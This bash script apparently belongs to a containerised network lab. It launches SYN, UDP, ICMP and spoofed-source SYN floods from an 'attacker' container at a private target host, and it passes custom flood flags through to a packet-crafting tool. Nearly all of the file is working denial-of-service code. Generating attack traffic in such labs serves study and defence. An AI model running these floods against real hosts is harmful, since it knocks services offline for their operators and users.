#!/bin/bash
# =============================================================
#  attack.sh — Generate DDoS traffic from the attacker (rping)
# =============================================================
# rping runs inside the "attacker" container and crafts raw
# packets toward the target through the Linux router.
set -euo pipefail

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

IFACE="eth0"          # attacker's only NIC (attack-net)
TARGET="10.0.2.10"    # target host behind the router

usage() {
    cat <<EOF
Usage: $0 <type> [extra rping args...]

Predefined attacks (run until Ctrl-C unless you append --count/--duration):
  syn-flood     TCP SYN flood to ${TARGET}:80
  udp-flood     UDP flood to ${TARGET}:53
  icmp-flood    ICMP echo flood to ${TARGET}
  spoof-flood   SYN flood with randomized source IPs (10.0.1.0/24)

Custom:
  custom "<rping args>"   Pass arbitrary flags to rping (interface is preset)

Examples:
  $0 syn-flood
  $0 syn-flood --duration 10s        # stop automatically after 10s
  $0 udp-flood -c 1000               # send 1000 packets then stop
  $0 custom "--tcp -S --dst-ip ${TARGET} --dst-port 1-1024 --flood"

Tip: run 'docker exec target tcpdump -i eth0 -n' in another terminal to watch.
EOF
    exit 1
}

run_attack() {
    echo -e "${GREEN}[+] rping ${NC}$*"
    echo -e "${YELLOW}[*] Ctrl-C to stop.${NC}"
    docker exec attacker rping -I "$IFACE" "$@"
}

[[ $# -lt 1 ]] && usage
type="$1"; shift || true

case "$type" in
    syn-flood)
        run_attack --tcp -S --dst-ip "$TARGET" --dst-port 80 --flood "$@"
        ;;
    udp-flood)
        run_attack --udp --dst-ip "$TARGET" --dst-port 53 --flood "$@"
        ;;
    icmp-flood)
        run_attack --icmp --dst-ip "$TARGET" --flood "$@"
        ;;
    spoof-flood)
        run_attack --tcp -S --src-ip 10.0.1.0/24 --dst-ip "$TARGET" --dst-port 80 --flood "$@"
        ;;
    custom)
        [[ $# -lt 1 ]] && { echo "Error: custom requires rping args"; usage; }
        run_attack "$@"
        ;;
    *)
        echo "Unknown attack type: $type"
        usage
        ;;
esac
